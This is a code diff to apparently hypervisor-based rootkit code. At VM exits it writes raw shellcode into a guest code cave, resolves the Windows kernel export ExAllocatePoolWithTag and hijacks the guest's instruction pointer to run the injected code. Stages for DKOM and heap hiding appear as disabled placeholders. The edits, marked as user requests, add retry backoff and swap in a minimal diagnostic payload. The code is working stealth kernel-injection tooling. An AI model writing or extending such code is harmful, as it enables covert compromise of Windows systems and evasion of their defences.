@@ -68,7 +68,7 @@ void handle_bsp_deployment(trap_frame_t *trap_frame) {
   // Thresholds
   constexpr uint64_t DKOM_THRESHOLD = UINT64_MAX;      // Disabled
   constexpr uint64_t SCAN_THRESHOLD = 20000;           // Stage 1.5-A: Scan
-  constexpr uint64_t INJECT_THRESHOLD = 20003;         // Stage 1.5-B: Inject
+  constexpr uint64_t INJECT_THRESHOLD = 20050;         // Stage 1.5-B: Inject
   constexpr uint64_t HEAP_HIDE_THRESHOLD = UINT64_MAX; // Stage 2: Hide
 
   ++vmexit_count;
@@ -96,9 +96,13 @@ void handle_bsp_deployment(trap_frame_t *trap_frame) {
     }
   }
 
-  // Stage 1.5-B: Inject & Hijack
+  // Stage 1.5-B: Injecting & Hijack
+  // User Requirement: Retry logic with backoff (50 exits) if context is invalid
+  static uint64_t next_injection_attempt = 0;
+
   if (injection_done == 0 && scan_done == 1 && g_codecave_pa != 0 &&
-      vmexit_count >= INJECT_THRESHOLD) {
+      vmexit_count >= INJECT_THRESHOLD &&
+      vmexit_count >= next_injection_attempt) {
 
     const uint8_t cpl = arch::get_guest_cpl();
     const uint64_t current_rip = arch::get_guest_rip();
@@ -109,11 +113,13 @@ void handle_bsp_deployment(trap_frame_t *trap_frame) {
 
     if (cpl != 0 || !is_kernel_rip) {
       // [Debug] Skip User Mode / Invalid Context
-      // User requested to log these attempts.
-      logs::print(
-          "[Runtime] Skipping Hijack Candidate: RIP=0x%p CPL=%d (Not Kernel)\n",
-          current_rip, cpl);
-      return; // Wait for next VMExit
+      // Backoff: Wait for 50 more exits before retrying to execute guest
+      next_injection_attempt = vmexit_count + 50;
+
+      logs::print("[Runtime] Skipping Hijack Candidate: RIP=0x%p CPL=%d "
+                  "(Retrying in 50 exits)\n",
+                  current_rip, cpl);
+      return; // Wait for next appropriate VMExit
     }
 
     // If we are here, we are in Kernel Mode (CPL=0).
@@ -126,11 +132,18 @@ void handle_bsp_deployment(trap_frame_t *trap_frame) {
         loader::get_kernel_export(g_ntoskrnl_base, "ExAllocatePoolWithTag");
 
     if (ex_alloc) {
-      // 2. Generate Shellcode
-      uint8_t code[128];
-      uint32_t code_size = 0;
-      loader::shellcode::generate_pool_allocation(code, code_size, ex_alloc,
-                                                  4096, 0x48797065); // 'Hype'
+      // 2. Generate Shellcode [TEST: MINIMAL DIAGNOSTIC]
+      // User Request: Force Enable Interrupts (STI) + Minimal Payload
+      uint8_t code[] = {
+          0xFB, // sti (Force Enable Interrupts)
+          0x48, 0xC7, 0xC0, 0x00, 0x50, 0x00, 0x00, // mov rax, 0x5000
+          0x48, 0xB9, 0x37, 0x13, 0x37, 0x13, 0x37,
+          0x13, 0x37, 0x13, // mov rcx, MAGIC
+          0x31, 0xD2,       // xor rdx, rdx
+          0x0F, 0xA2        // cpuid
+      };
+
+      uint32_t code_size = sizeof(code);
 
       // 3. Map Codecave & Write
       // Use Direct Host Mapping (Identity) to avoid SLAT
@@ -144,12 +157,9 @@ void handle_bsp_deployment(trap_frame_t *trap_frame) {
 
       if (mapped_cave && size_left >= code_size) {
         crt::copy_memory(mapped_cave, code, code_size);
-        logs::print("[Runtime] Shellcode written to PA:0x%p\n", g_codecave_pa);
+        logs::print("[Runtime] Minimal Shellcode written to PA:0x%p\n",
+                    g_codecave_pa);
 
-        // 4. Hijack RIP & Backup Context
-        g_backup_rip = arch::get_guest_rip();
-        g_backup_rsp = arch::get_guest_rsp();       // Explicitly backup RSP
-        g_backup_rflags = arch::get_guest_rflags(); // Save Flags
         // 4. Hijack RIP & Backup Context
         g_backup_rip = arch::get_guest_rip();
         g_backup_rsp = arch::get_guest_rsp();       // Explicitly backup RSP
@@ -159,13 +169,15 @@ void handle_bsp_deployment(trap_frame_t *trap_frame) {
 
         arch::set_guest_rip(g_codecave_va);
 
-        // [SAFETY] Disable Interrupts & Clear Interruptibility State
-        // Ensure shellcode runs atomically without interference from NMI/IRQ
-        arch::set_guest_rflags(g_backup_rflags & ~0x200); // Clear IF (Bit 9)
+        // [USER REQUEST] Force Enable Interrupts
+        // Avoid "Blind" execution which might cause deadlocks if system needs
+        // handling
+        arch::set_guest_rflags(g_backup_rflags | 0x200); // Force IF (Bit 9) = 1
         arch::clear_guest_interruptibility();
 
-        logs::print("[Runtime] HIJACKED: RIP 0x%p -> 0x%p (IF Disabled)\n",
-                    g_backup_rip, g_codecave_va);
+        logs::print(
+            "[Runtime] HIJACKED: RIP 0x%p -> 0x%p (IF Forced Enabled)\n",
+            g_backup_rip, g_codecave_va);
         injection_done = 1;
       } else {
         logs::print("[Runtime] Failed to map Codecave for writing.\n");
